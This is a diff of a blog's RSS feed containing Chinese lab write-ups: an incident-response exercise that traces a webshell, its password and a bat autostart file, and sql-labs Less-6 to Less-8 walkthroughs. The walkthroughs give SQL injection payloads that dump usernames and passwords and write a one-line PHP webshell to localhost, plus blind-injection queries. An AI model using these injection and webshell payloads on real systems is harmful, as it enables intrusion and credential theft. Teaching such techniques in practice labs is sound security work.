-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325151645.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250325151645&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325151625.png&#34; alt=&#34;Pasted image 20250325151625&#34;&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325151645.png&#34; alt=&#34;Pasted image 20250325151645&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -489,19 +307,10 @@ flag&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag{C:\phpstudy_pro\WWW\.x.php}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;flag5&#34;&gt;flag5
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）&lt;/strong&gt;&lt;br&gt;
+&lt;/div&gt;&lt;h1 id=&#34;flag5&#34;&gt;flag5&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）&lt;/strong&gt;&lt;br&gt;
 D盾直接扫描即可：&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325152028.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250325152028&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325152028.png&#34; alt=&#34;Pasted image 20250325152028&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -510,8 +319,8 @@ D盾直接扫描即可：&lt;br&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag{C:\phpstudy_pro\WWW\usr\themes\default\post.php}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;flag6&#34;&gt;flag6
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag{1.exe}&lt;/strong&gt;&lt;br&gt;
+&lt;/div&gt;&lt;h1 id=&#34;flag6&#34;&gt;flag6&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag{1.exe}&lt;/strong&gt;&lt;br&gt;
 查看开机自动文件夹，并没有发现有什么恶意的东西。&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -526,26 +335,8 @@ D盾直接扫描即可：&lt;br&gt;
 &lt;/div&gt;&lt;p&gt;并无可疑文件，接下来查看 &lt;code&gt;Temp&lt;/code&gt; 目录和 &lt;code&gt;Windows&lt;/code&gt; 目录&lt;br&gt;
 在 &lt;code&gt;Windows&lt;/code&gt; 目录下，发现可疑文件&lt;br&gt;
 在windows目录下，发现一个x.bat文件，发现这个bat文件是打开360.exe文件&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325153807.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250325153807&#34;
-	
-	
-&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325161044.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250325161044&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325153807.png&#34; alt=&#34;Pasted image 20250325153807&#34;&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325161044.png&#34; alt=&#34;Pasted image 20250325161044&#34;&gt;&lt;br&gt;
 flag&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -563,36 +354,17 @@ flag&lt;/p&gt;
         <pubDate>Sun, 31 Aug 2025 00:00:00 +0000</pubDate>
         
         <guid>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget-j-01/</guid>
-        <description>&lt;img src="http://localhost:1313/images/24.webp" alt="Featured image of post 【玄机靶场】应急响应-vulntarget-j-01" /&gt;&lt;h1 id=&#34;简介&#34;&gt;简介
-&lt;/h1&gt;&lt;p&gt;题目来源公众号  vulntarget&lt;br&gt;
-&lt;a class=&#34;link&#34; href=&#34;https://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg&lt;/a&gt;&lt;br&gt;
+        <description>&lt;img src="http://localhost:1313/images/24.webp" alt="Featured image of post 【玄机靶场】应急响应-vulntarget-j-01" /&gt;&lt;h1 id=&#34;简介&#34;&gt;简介&lt;/h1&gt;
+&lt;p&gt;题目来源公众号  vulntarget&lt;br&gt;
+&lt;a href=&#34;https://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg&#34;&gt;https://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg&lt;/a&gt;&lt;br&gt;
 任务环境说明&lt;br&gt;
 windows账密：workstation admin@20221123&lt;br&gt;
 web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
-&lt;h1 id=&#34;flag1&#34;&gt;flag1
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;主站进入后台的文件名称？&lt;/strong&gt;&lt;br&gt;
+&lt;h1 id=&#34;flag1&#34;&gt;flag1&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;主站进入后台的文件名称？&lt;/strong&gt;&lt;br&gt;
 查看apache日志，找到&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325111723.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250325111723&#34;
-	
-	
-&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325111801.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250325111801&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325111723.png&#34; alt=&#34;Pasted image 20250325111723&#34;&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325111801.png&#34; alt=&#34;Pasted image 20250325111801&#34;&gt;&lt;br&gt;
 flag&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -602,19 +374,10 @@ flag&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag{FNeSOgYGkp.php}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;flag2&#34;&gt;flag2
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;黑客是从哪个端口上传木马文件的?&lt;/strong&gt;&lt;br&gt;
+&lt;/div&gt;&lt;h1 id=&#34;flag2&#34;&gt;flag2&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;黑客是从哪个端口上传木马文件的?&lt;/strong&gt;&lt;br&gt;
 打开小皮查看网页端口，7001打不开，所以为80&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325111917.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250325111917&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325111917.png&#34; alt=&#34;Pasted image 20250325111917&#34;&gt;&lt;br&gt;
 flag&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -624,29 +387,11 @@ flag&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag{80}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;flag3&#34;&gt;flag3
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;黑客添加的木马文件名称和密码分别是什么，将黑客添加 的木马名称和密码作为flag提交{fag(名称:密码)&lt;/strong&gt;&lt;br&gt;
+&lt;/div&gt;&lt;h1 id=&#34;flag3&#34;&gt;flag3&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;黑客添加的木马文件名称和密码分别是什么，将黑客添加 的木马名称和密码作为flag提交{fag(名称:密码)&lt;/strong&gt;&lt;br&gt;
 直接可以使用D盾扫出该文件。然后使用webshell检测一下，发现确实是webshell后门工具。&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325112640.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250325112640&#34;
-	
-	
-&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325112156.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250325112156&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325112640.png&#34; alt=&#34;Pasted image 20250325112640&#34;&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325112156.png&#34; alt=&#34;Pasted image 20250325112156&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -655,18 +400,9 @@ flag&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag{api3.php:Admin}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;flag4&#34;&gt;flag4
-&lt;/h1&gt;&lt;p&gt;可以根据日志查看：&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325131342.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250325131342&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;h1 id=&#34;flag4&#34;&gt;flag4&lt;/h1&gt;
+&lt;p&gt;可以根据日志查看：&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325131342.png&#34; alt=&#34;Pasted image 20250325131342&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -683,20 +419,11 @@ flag&lt;/p&gt;
         <pubDate>Sat, 30 Aug 2025 00:00:00 +0000</pubDate>
         
         <guid>http://localhost:1313/p/%E9%9D%B6%E5%9C%BAsql-labs-less-6-14/</guid>
-        <description>&lt;img src="http://localhost:1313/images/22.webp" alt="Featured image of post 【靶场】sql-labs-Less 6-14" /&gt;&lt;h1 id=&#34;less-6&#34;&gt;Less-6
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;验证注入点：双引号报错，两个双引号闭合利用闭合方式：&lt;code&gt;&amp;quot; &amp;lt;payload&amp;gt; --+&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;
+        <description>&lt;img src="http://localhost:1313/images/22.webp" alt="Featured image of post 【靶场】sql-labs-Less 6-14" /&gt;&lt;h1 id=&#34;less-6&#34;&gt;Less-6&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;验证注入点：双引号报错，两个双引号闭合利用闭合方式：&lt;code&gt;&amp;quot; &amp;lt;payload&amp;gt; --+&lt;/code&gt;&lt;/strong&gt;&lt;br&gt;
 就闭合方式和 Less-5 不一样外，其余都一样&lt;br&gt;
 1.进入第六题，显示&lt;code&gt;Please input the ID as parameter with numeric value&lt;/code&gt;，告诉了我们参数为&lt;strong&gt;id&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313192901.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250313192901&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313192901.png&#34; alt=&#34;Pasted image 20250313192901&#34;&gt;&lt;br&gt;
 发现闭合方式为&amp;quot;，和上一关同理采用报错注入，这里用extractvalue函数&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -706,16 +433,7 @@ flag&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://localhost/sqli-labs/Less-6/?id=1&amp;#34;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314110439.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250314110439&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314110439.png&#34; alt=&#34;Pasted image 20250314110439&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -724,18 +442,9 @@ flag&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34; and extractvalue(1,concat(0x7e,(select concat(username,&amp;#39;:&amp;#39;,password) from users limit 0,1)))--+
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314110536.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250314110536&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h1 id=&#34;less-7&#34;&gt;Less-7
-&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;验证注入点：单引号报错，两个单引号闭合利用闭合方式：&lt;code&gt;&#39;)) &amp;lt;payload&amp;gt; --+&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314110536.png&#34; alt=&#34;Pasted image 20250314110536&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;less-7&#34;&gt;Less-7&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;验证注入点：单引号报错，两个单引号闭合利用闭合方式：&lt;code&gt;&#39;)) &amp;lt;payload&amp;gt; --+&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -744,16 +453,7 @@ flag&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;labs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Less&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314110703.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250314110703&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314110703.png&#34; alt=&#34;Pasted image 20250314110703&#34;&gt;&lt;br&gt;
 前置知识:&lt;br&gt;
 文件读写注入条件：&lt;br&gt;
 在配置文件中设置&lt;br&gt;
@@ -779,16 +479,7 @@ flag&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;show&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;variables&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;%secure%&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314113015.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250314113015&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314113015.png&#34; alt=&#34;Pasted image 20250314113015&#34;&gt;&lt;br&gt;
 php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;&lt;strong&gt;magic_quotes_gpc = Off&lt;/strong&gt;&lt;/li&gt;
@@ -818,16 +509,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;://&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;labs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Less&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--+&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314111716.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250314111716&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314111716.png&#34; alt=&#34;Pasted image 20250314111716&#34;&gt;&lt;br&gt;
 利用文件读写注入写入木马：&lt;br&gt;
 写入一句话木马：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -846,18 +528,9 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;连接地址：http://localhost/hack.php&lt;br&gt;
 连接密码：pwd&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314132112.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250314132112&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h1 id=&#34;less-8&#34;&gt;Less-8
-&lt;/h1&gt;&lt;p&gt;&amp;lsquo;闭合 布尔盲注&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314132112.png&#34; alt=&#34;Pasted image 20250314132112&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;less-8&#34;&gt;Less-8&lt;/h1&gt;
+&lt;p&gt;&amp;lsquo;闭合 布尔盲注&lt;br&gt;
 使用的注入语句和第五关的布尔盲注一样&lt;br&gt;
 示例，判断长度：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -868,16 +541,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://localhost/sqli-labs/Less-8/?id=1&amp;#39;and length((select database()))&amp;gt;7 --+
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317132316.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250317132316&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317132316.png&#34; alt=&#34;Pasted image 20250317132316&#34;&gt;&lt;br&gt;
 写shell：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -887,29 +551,11 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
